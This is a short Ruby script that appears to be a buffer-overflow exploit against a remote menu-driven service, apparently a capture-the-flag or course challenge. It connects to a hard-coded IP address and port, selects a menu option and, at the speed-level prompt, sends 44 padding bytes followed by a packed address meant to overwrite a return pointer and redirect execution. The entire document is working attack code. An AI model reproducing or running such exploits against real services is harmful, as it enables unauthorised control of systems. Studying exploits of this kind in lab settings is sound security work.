require 'socket'

s = TCPSocket.new '140.113.194.85' , 49169

while line = s.gets
	if line.include? "3.Exit"
		s.puts "1"
	end
	if line.include? "Choose the speed level(1-9):"
		s.puts 'A'*44 + "\xcd\x88\x04\x08"
	end

	puts line
end


s.close
